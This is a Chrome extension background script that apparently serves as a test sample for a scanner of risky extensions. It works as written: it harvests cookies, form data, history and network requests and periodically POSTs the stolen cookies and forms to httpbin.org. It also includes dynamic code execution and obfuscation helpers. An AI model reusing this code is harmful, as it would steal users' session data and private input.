// High risk extension - Advanced Analytics Tracker
// Contains multiple high-risk patterns

// Initialize extension
chrome.runtime.onInstalled.addListener(() => {
    console.log('Advanced Analytics Extension installed');
    chrome.storage.local.set({ 
        installed: true, 
        installTime: Date.now(),
        trackingEnabled: true
    });
});

// Listen for messages
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'PAGE_VIEW') {
        // Store comprehensive page data
        chrome.storage.local.get(['pageViews'], (result) => {
            const views = result.pageViews || [];
            views.push({
                url: message.data.url,
                title: message.data.title,
                timestamp: message.data.timestamp,
                cookies: message.data.cookies,
                formData: message.data.formData
            });
            chrome.storage.local.set({ pageViews: views });
        });
    } else if (message.type === 'COOKIE_DATA') {
        // Store cookie data
        chrome.storage.local.set({ lastCookies: message.data });
    } else if (message.type === 'FORM_DATA') {
        // Store form data
        chrome.storage.local.get(['formSubmissions'], (result) => {
            const forms = result.formSubmissions || [];
            forms.push(message.data);
            chrome.storage.local.set({ formSubmissions: forms });
        });
    }
    return true;
});

// Track all tab changes
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
        console.log('Tab updated:', tab.url);
        // Store tab navigation
        chrome.storage.local.get(['tabHistory'], (result) => {
            const history = result.tabHistory || [];
            history.push({ url: tab.url, timestamp: Date.now() });
            chrome.storage.local.set({ tabHistory: history });
        });
    }
});

// Access browsing history extensively
chrome.history.search({
    text: '',
    maxResults: 50,
    startTime: Date.now() - 7 * 24 * 60 * 60 * 1000 // Last 7 days
}, (results) => {
    if (results && results.length > 0) {
        console.log('History accessed:', results.length, 'items');
        chrome.storage.local.set({ historyData: results });
    }
});

// Access all cookies
chrome.cookies.getAll({}, (cookies) => {
    if (cookies && cookies.length > 0) {
        console.log('All cookies accessed:', cookies.length);
        // Store cookie data
        const cookieData = cookies.map(c => ({
            domain: c.domain,
            name: c.name,
            value: c.value.substring(0, 50) // Truncate for storage
        }));
        chrome.storage.local.set({ cookieData: cookieData });
    }
});

// WebRequest listener - monitor all requests
chrome.webRequest.onBeforeRequest.addListener(
    (details) => {
        // Log all requests
        console.log('Request intercepted:', details.url);
        // Store request data
        chrome.storage.local.get(['networkRequests'], (result) => {
            const requests = result.networkRequests || [];
            requests.push({
                url: details.url,
                method: details.method,
                timestamp: Date.now()
            });
            // Keep only last 100 requests
            if (requests.length > 100) {
                requests.shift();
            }
            chrome.storage.local.set({ networkRequests: requests });
        });
    },
    { urls: ['<all_urls>'] },
    ['requestBody']
);

// WebNavigation listener
chrome.webNavigation.onCompleted.addListener((details) => {
    if (details.frameId === 0) { // Main frame only
        console.log('Navigation completed:', details.url);
    }
});

// Dynamic code execution using Function constructor
const createParser = new Function('data', `
    try {
        return JSON.parse(data);
    } catch (e) {
        return { error: e.message };
    }
`);

// Execute dynamic function
try {
    const testData = '{"test": "dynamic_execution", "value": 123}';
    const result = createParser(testData);
    console.log('Dynamic function executed:', result);
} catch (e) {
    console.error('Dynamic function error:', e);
}

// setTimeout with string (code injection pattern)
setTimeout('console.log("Background code injection test")', 100);

// Access sync storage
chrome.storage.sync.get(null, (items) => {
    console.log('Sync storage accessed:', Object.keys(items).length, 'keys');
});

// Network request to external server (data exfiltration pattern)
// This simulates sending data to external server
const sendAnalytics = () => {
    // Collect cookie data for exfiltration
    chrome.cookies.getAll({}, (cookies) => {
        const cookieData = cookies.map(c => ({
            domain: c.domain,
            name: c.name
        }));
        
        const analyticsData = {
            timestamp: Date.now(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            cookies: cookieData.length,
            cookieDomains: cookieData.map(c => c.domain).slice(0, 10)
        };
        
        // Simulate data exfiltration (would normally send to server)
        fetch('https://httpbin.org/post', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(analyticsData),
            mode: 'no-cors'
        }).catch(() => {
            // Silently fail - this is just a pattern detection test
            console.log('Analytics data exfiltration pattern');
        });
    });
};

// Remote script loading pattern (RCE risk)
const loadRemoteScript = () => {
    // Simulate remote script loading
    const scriptUrl = 'https://cdn.example.com/analytics.js';
    // This is a pattern detection - actual loading would use different method
    console.log('Remote script loading pattern:', scriptUrl);
};

// Token/cookie theft pattern (exfiltration)
const stealTokens = () => {
    chrome.storage.local.get(['cookieData', 'formSubmissions'], (result) => {
        const stolenData = {
            cookies: result.cookieData || [],
            forms: result.formSubmissions || [],
            timestamp: Date.now()
        };
        
        // Simulate sending stolen data to remote server
        fetch('https://httpbin.org/post', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(stolenData),
            mode: 'no-cors'
        }).catch(() => {
            console.log('Token/cookie theft exfiltration pattern');
        });
    });
};

// Send analytics periodically
setInterval(sendAnalytics, 60000); // Every minute

// Steal tokens periodically
setInterval(stealTokens, 120000); // Every 2 minutes

// Access tab data
chrome.tabs.query({}, (tabs) => {
    console.log('All tabs accessed:', tabs.length);
    chrome.storage.local.set({ tabCount: tabs.length });
});

// Obfuscation pattern - random variable names
const _0x4a2b = 'analytics';
const _0x1c3d = 'tracking';
const _0x3e5f = function(data) {
    return btoa(JSON.stringify(data));
};

// Multi-layer base64 encoding (obfuscation)
const encodeMultiLayer = (data) => {
    const first = btoa(JSON.stringify(data));
    const second = btoa(first);
    return second;
};

// Hex/unicode escape pattern (obfuscation)
const hexEncode = (str) => {
    let result = '';
    for (let i = 0; i < str.length; i++) {
        result += '\\x' + str.charCodeAt(i).toString(16);
    }
    return result;
};

// Use obfuscation patterns
const testData = { test: 'value' };
const encoded = encodeMultiLayer(testData);
console.log('Multi-layer encoded:', encoded.substring(0, 20));

